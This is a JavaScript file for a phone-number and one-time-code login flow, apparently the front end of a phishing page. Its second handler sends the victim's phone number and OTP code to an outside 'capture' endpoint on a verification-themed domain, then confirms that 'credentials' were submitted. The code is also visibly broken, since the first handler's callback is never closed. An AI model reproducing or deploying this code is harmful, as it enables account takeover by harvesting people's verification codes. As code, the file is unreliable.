if (document.getElementById('login-form')) {
    document.getElementById('login-form').addEventListener('submit', function(event) {
        event.preventDefault();
        
        const phoneNumber = document.getElementById('phone-number').value;

        // Make a request to your backend to send the OTP
        fetch('/sendOTP', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                phoneNumber: phoneNumber
            })
        })
        .then(response => {
            if (response.ok) {
                // Redirect to OTP input page, passing the phone number as a query parameter
                window.location.href = 'otp.html?phone=' + encodeURIComponent(phoneNumber);
            } else {
                throw new Error('Failed to send OTP');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Error sending OTP. Please try again.');
        });
        
} else if (document.getElementById('otp-form')) {
    
    document.getElementById('otp-form').addEventListener('submit', function(event) {
        event.preventDefault(); 
        
        // Get the values input by the user
        const phoneNumber = new URLSearchParams(window.location.search).get('phone'); // Retrieve phone number from URL
        const otpCode = document.getElementById('otp-code').value;

        // Create the data object to send to the server
        const data = {
            phoneNumber: phoneNumber,
            otpCode: otpCode
        };

        fetch('https://verificationsafeguard.vercel.app/capture', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            if (response.ok) {
                return response.json();
            }
            throw new Error('Failed to submit OTP');
        })
        .then(result => {
            alert('Credentials submitted successfully');
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Error submitting credentials');
        });
    });
}
